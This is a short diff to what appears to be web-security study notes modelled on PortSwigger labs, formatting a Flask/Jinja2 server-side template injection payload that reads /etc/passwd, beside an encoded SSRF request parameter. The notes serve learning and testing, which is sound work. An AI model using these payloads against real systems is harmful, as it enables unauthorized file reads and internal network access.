@@ -4145,7 +4145,7 @@ stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2
 [Freemarker](#freemarker)  
 [ERB](#erb)  
 [Handlebars](#handlebars)  
-Flask -> {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}  
+Flask -> `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`  
 
 >Use the web framework native template syntax to inject a malicious payload into a **{{input}}**, which is then executed server-side. Submitting invalid syntax will often result in error message that lead to ***identifying*** the template framework. Use PortSwigger [template decision tree](https://portswigger.net/web-security/images/template-decision-tree.png) to aid in ***identification***.  
 
